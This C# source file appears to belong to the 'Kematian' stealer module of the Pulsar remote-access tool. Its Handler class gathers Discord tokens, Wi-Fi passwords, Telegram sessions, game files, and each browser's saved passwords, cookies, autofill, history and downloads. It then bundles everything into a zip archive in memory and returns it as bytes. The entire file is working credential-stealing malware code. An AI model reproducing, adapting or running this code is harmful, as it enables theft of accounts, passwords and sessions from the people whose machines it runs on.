using Pulsar.Client.Kematian.Browsers;
using Pulsar.Client.Kematian.Discord;
using Pulsar.Client.Kematian.Wifi;
using Pulsar.Client.Kematian.Telegram;
using Pulsar.Client.Kematian.Games;
using System;
using System.Diagnostics;
using System.Collections.Concurrent;
using System.Collections.Generic;
using System.IO;
using System.IO.Compression;
using System.Linq;
using System.Threading;
using System.Threading.Tasks;

namespace Pulsar.Client.Kematian
{
    public class Handler
    {
        private static ConcurrentDictionary<CancellationToken, List<Task>> _activeTasks = 
            new ConcurrentDictionary<CancellationToken, List<Task>>();
            
        public static byte[] GetData(int timeoutInSeconds = 60)
        {
            CancellationTokenSource cts = new CancellationTokenSource(TimeSpan.FromSeconds(timeoutInSeconds));
            try
            {
                return GetData(cts.Token);
            }
            finally
            {
                cts.Dispose();
            }
        }

        public static byte[] GetData(CancellationToken cancellationToken = default(CancellationToken))
        {
            return GetData(cancellationToken, null);
        }
        
        public static byte[] GetData(CancellationToken cancellationToken, IProgress<int> progress)
        {
            _activeTasks.TryRemove(cancellationToken, out _);
            List<Task> taskList = new List<Task>();
            _activeTasks[cancellationToken] = taskList;
            
            byte[] data = null;
            MemoryStream memoryStream = new MemoryStream();
            SemaphoreSlim semaphore = null;
            int completedTasks = 0;
            int totalTasks = 0;
            
            try
            {
                cancellationToken.ThrowIfCancellationRequested();
                
                ZipArchive archive = new ZipArchive(memoryStream, ZipArchiveMode.Create, true);
                try
                {
                    var retriever = new BrowsersRetriever();
                    var browserInfo = retriever.GetBrowserInfo();

                    var sortedBrowserInfo = browserInfo
                        .OrderBy(b => b.Key)
                        .ToDictionary(k => k.Key, v => v.Value);
                    
                    var textMethods = new KeyValuePair<Func<string>, string>[]
                    {
                        new KeyValuePair<Func<string>, string>(GetTokens.Tokens, "Discord/tokens.txt"),
                        new KeyValuePair<Func<string>, string>(GetWifis.Passwords, "Wifi/Wifi.txt"),
                        new KeyValuePair<Func<string>, string>(TelegramRetriever.GetTelegramSessions, "Telegram/sessions.txt")
                    };

                    var browserMethodGenerators = new Dictionary<string, Func<string, KeyValuePair<Func<string>, string>[]>>
                    {
                        {
                            "Methods", browserName => new KeyValuePair<Func<string>, string>[]
                            {
                                new KeyValuePair<Func<string>, string>(() => retriever.GetAutoFillDataForBrowser(browserName), "autofill.json"),
                                new KeyValuePair<Func<string>, string>(() => retriever.GetCookiesForBrowser(browserName), "cookies_netscape.txt"),
                                new KeyValuePair<Func<string>, string>(() => retriever.GetDownloadsForBrowser(browserName), "downloads.json"),
                                new KeyValuePair<Func<string>, string>(() => retriever.GetHistoryForBrowser(browserName), "history.json"),
                                new KeyValuePair<Func<string>, string>(() => retriever.GetPasswordsForBrowser(browserName), "passwords.json")
                            }
                        }
                    };

                    List<Tuple<string, byte[]>> entryResults = new List<Tuple<string, byte[]>>();

                    semaphore = new SemaphoreSlim(Environment.ProcessorCount);
                    
                    try
                    {
                        totalTasks = textMethods.Length;
                        foreach (var browser in sortedBrowserInfo)
                        {
                            totalTasks += browserMethodGenerators["Methods"](browser.Key).Length;
                        }
                        totalTasks += 2; // tg, games
                        
                        progress?.Report(0);
                        
                        cancellationToken.ThrowIfCancellationRequested();

                        var allTasks = new List<Task>();
                        
                        foreach (var methodPair in textMethods)
                        {
                            string path = methodPair.Value;
                            try
                            {
                                cancellationToken.ThrowIfCancellationRequested();
                                
                                string content = methodPair.Key();
                                if (!string.IsNullOrEmpty(content))
                                {
                                    byte[] contentBytes = System.Text.Encoding.UTF8.GetBytes(content);
                                    entryResults.Add(new Tuple<string, byte[]>(path, contentBytes));
                                }

                                if (!cancellationToken.IsCancellationRequested)
                                {
                                    int completed = Interlocked.Increment(ref completedTasks);
                                    try 
                                    {
                                        int percentage = (int)((double)completed / totalTasks * 100);
                                        progress?.Report(percentage);
                                    }
                                    catch { }
                                }
                            }
                            catch (OperationCanceledException)
                            {

                            }
                            catch (Exception ex)
                            {
                                Debug.WriteLine($"Error processing {path}: {ex.Message}");

                                if (!cancellationToken.IsCancellationRequested)
                                {
                                    try
                                    {
                                        int completed = Interlocked.Increment(ref completedTasks);
                                        int percentage = (int)((double)completed / totalTasks * 100);
                                        progress?.Report(percentage);
                                    }
                                    catch { }
                                }
                            }
                        }

                        foreach (var browser in sortedBrowserInfo)
                        {
                            string browserName = browser.Key;
                            string browserBasePath = $"Browsers/{browserName}";
                            
                            var browserMethods = browserMethodGenerators["Methods"](browserName);
                            
                            foreach (var methodPair in browserMethods)
                            {
                                string methodName = methodPair.Value;
                                string fullPath = $"{browserBasePath}/{methodName}";
                                
                                try
                                {
                                    cancellationToken.ThrowIfCancellationRequested();
                                    
                                    string content = methodPair.Key();
                                    if (!string.IsNullOrEmpty(content))
                                    {
                                        byte[] contentBytes = System.Text.Encoding.UTF8.GetBytes(content);
                                        entryResults.Add(new Tuple<string, byte[]>(fullPath, contentBytes));
                                    }

                                    if (!cancellationToken.IsCancellationRequested)
                                    {
                                        int completed = Interlocked.Increment(ref completedTasks);
                                        try
                                        {
                                            int percentage = (int)((double)completed / totalTasks * 100);
                                            progress?.Report(percentage);
                                        }
                                        catch { }
                                    }
                                }
                                catch (OperationCanceledException)
                                {

                                }
                                catch (Exception ex)
                                {
                                    Debug.WriteLine($"Error processing {fullPath}: {ex.Message}");

                                    if (!cancellationToken.IsCancellationRequested)
                                    {
                                        try
                                        {
                                            int completed = Interlocked.Increment(ref completedTasks);
                                            int percentage = (int)((double)completed / totalTasks * 100);
                                            progress?.Report(percentage);
                                        }
                                        catch { }
                                    }
                                }
                            }
                        }

                        var telegramTask = Task.Run(() =>
                        {
                            try
                            {
                                cancellationToken.ThrowIfCancellationRequested();
                                
                                if (semaphore.Wait(50, cancellationToken))
                                {
                                    try
                                    {
                                        cancellationToken.ThrowIfCancellationRequested();
                                        
                                        var telegramFiles = TelegramRetriever.GetTelegramSessionFiles();
                                        foreach (var file in telegramFiles)
                                        {
                                            if (cancellationToken.IsCancellationRequested)
                                                break;

                                            entryResults.Add(new Tuple<string, byte[]>(file.Key, file.Value));
                                        }
                                    }
                                    finally
                                    {
                                        try { semaphore.Release(); } catch { }
                                        
                                        if (!cancellationToken.IsCancellationRequested)
                                        {
                                            int completed = Interlocked.Increment(ref completedTasks);
                                            try
                                            {
                                                int percentage = (int)((double)completed / totalTasks * 100);
                                                progress?.Report(percentage);
                                            }
                                            catch { }
                                        }
                                    }
                                }
                            }
                            catch (OperationCanceledException)
                            {

                            }
                            catch (ObjectDisposedException)
                            {

                            }
                            catch (Exception ex)
                            {
                                Debug.WriteLine($"Error processing Telegram session files: {ex.Message}");

                                if (!cancellationToken.IsCancellationRequested)
                                {
                                    try
                                    {
                                        int completed = Interlocked.Increment(ref completedTasks);
                                        int percentage = (int)((double)completed / totalTasks * 100);
                                        progress?.Report(percentage);
                                    }
                                    catch { }
                                }
                            }
                        }, cancellationToken);
                        
                        taskList.Add(telegramTask);

                        var gamesTask = Task.Run(() =>
                        {
                            try
                            {
                                cancellationToken.ThrowIfCancellationRequested();
                                
                                if (semaphore.Wait(50, cancellationToken))
                                {
                                    try
                                    {
                                        cancellationToken.ThrowIfCancellationRequested();
                                        
                                        var gameFiles = GamesRetriever.GetGameFiles();
                                        foreach (var file in gameFiles)
                                        {
                                            if (cancellationToken.IsCancellationRequested)
                                                break;

                                            entryResults.Add(new Tuple<string, byte[]>(file.Key, file.Value));
                                        }
                                    }
                                    finally
                                    {
                                        try { semaphore.Release(); } catch { }
                                        
                                        if (!cancellationToken.IsCancellationRequested)
                                        {
                                            int completed = Interlocked.Increment(ref completedTasks);
                                            try
                                            {
                                                int percentage = (int)((double)completed / totalTasks * 100);
                                                progress?.Report(percentage);
                                            }
                                            catch { }
                                        }
                                    }
                                }
                            }
                            catch (OperationCanceledException)
                            {

                            }
                            catch (ObjectDisposedException)
                            {

                            }
                            catch (Exception ex)
                            {
                                Debug.WriteLine($"Error processing game files: {ex.Message}");
                                
                                if (!cancellationToken.IsCancellationRequested)
                                {
                                    try
                                    {
                                        int completed = Interlocked.Increment(ref completedTasks);
                                        int percentage = (int)((double)completed / totalTasks * 100);
                                        progress?.Report(percentage);
                                    }
                                    catch { }
                                }
                            }
                        }, cancellationToken);
                        
                        taskList.Add(gamesTask);

                        try
                        {
                            cancellationToken.ThrowIfCancellationRequested();
                            
                            Task.WaitAll(taskList.ToArray(), millisecondsTimeout: 30000, cancellationToken);
                        }
                        catch (OperationCanceledException)
                        {
                            throw;
                        }
                        catch (AggregateException ae)
                        {
                            bool allCancellations = true;
                            foreach (var ex in ae.InnerExceptions)
                            {
                                if (!(ex is OperationCanceledException))
                                {
                                    allCancellations = false;
                                    Debug.WriteLine($"Unhandled exception: {ex.Message}");
                                }
                            }
                            
                            if (allCancellations)
                            {
                                throw new OperationCanceledException();
                            }
                        }
                    }
                    finally
                    {
                        _activeTasks.TryRemove(cancellationToken, out _);
                        
                        if (semaphore != null)
                        {
                            try
                            {
                                semaphore.Dispose();
                                semaphore = null;
                            }
                            catch { }
                        }
                    }
                    
                    if (cancellationToken.IsCancellationRequested)
                    {
                        throw new OperationCanceledException();
                    }
                    
                    foreach (var entryResult in entryResults)
                    {
                        cancellationToken.ThrowIfCancellationRequested();
                        
                        string path = entryResult.Item1;
                        byte[] fileData = entryResult.Item2;

                        try
                        {
                            var zipEntry = archive.CreateEntry(path);
                            using (var entryStream = zipEntry.Open())
                            {
                                entryStream.Write(fileData, 0, fileData.Length);
                            }
                        }
                        catch (Exception ex)
                        {
                            Debug.WriteLine($"Error adding {path} to archive: {ex.Message}");
                        }
                    }
                    
                    if (!cancellationToken.IsCancellationRequested)
                    {
                        try
                        {
                            progress?.Report(100);
                        }
                        catch { }
                    }
                }
                finally
                {
                    try
                    {
                        archive.Dispose();
                    }
                    catch { }
                }

                if (!cancellationToken.IsCancellationRequested)
                {
                    try
                    {
                        memoryStream.Position = 0;
                        data = memoryStream.ToArray();
                    }
                    catch (Exception ex)
                    {
                        Debug.WriteLine($"Error creating data array: {ex.Message}");
                    }
                }
            }
            catch (OperationCanceledException)
            {
                Debug.WriteLine("Kematian data collection was canceled.");
                throw;
            }
            catch (Exception ex)
            {
                Debug.WriteLine($"Error creating zip: {ex.Message}");
            }
            finally
            {
                try
                {
                    memoryStream.Dispose();
                }
                catch { }
                
                if (semaphore != null)
                {
                    try
                    {
                        semaphore.Dispose();
                    }
                    catch { }
                }
            }

            return data;
        }
    }
}